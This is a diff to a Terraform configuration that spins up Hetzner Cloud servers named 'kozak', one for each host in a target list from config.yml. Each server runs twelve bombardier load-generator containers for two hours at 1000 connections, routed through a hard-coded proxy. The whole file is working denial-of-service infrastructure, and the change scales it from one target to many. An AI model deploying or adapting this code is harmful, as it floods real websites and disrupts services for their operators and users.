@@ -1,3 +1,7 @@
+locals {
+  t       = yamldecode(file("config.yml"))
+  t_array = flatten([for i in local.t.targets : [for j in range(tonumber(i.count)) : i.host]])
+}
 resource "tls_private_key" "ssh_key" {
   algorithm = "RSA"
   rsa_bits  = 4096
@@ -15,14 +19,13 @@ resource "hcloud_ssh_key" "cloud_ssh_key" {
 }
 
 resource "hcloud_server" "kozak" {
-  count       = var.kozak_count
+  count       = length(local.t_array)
   name        = "kozak-${count.index}"
   image       = var.os_type
   server_type = var.server_type
   location    = var.location
   ssh_keys    = [hcloud_ssh_key.cloud_ssh_key.id]
-  # user_data   = file("user_data.yml")
-  user_data = <<EOF
+  user_data   = <<EOF
 #cloud-config
 users:
   - name: kozak
@@ -52,17 +55,17 @@ runcmd:
   - export http_proxy=http://91.221.17.220:8000
   - export HTTP_PROXY=http://91.221.17.220:8000
   - apt-get update -y
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${var.target}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
 EOF
 }
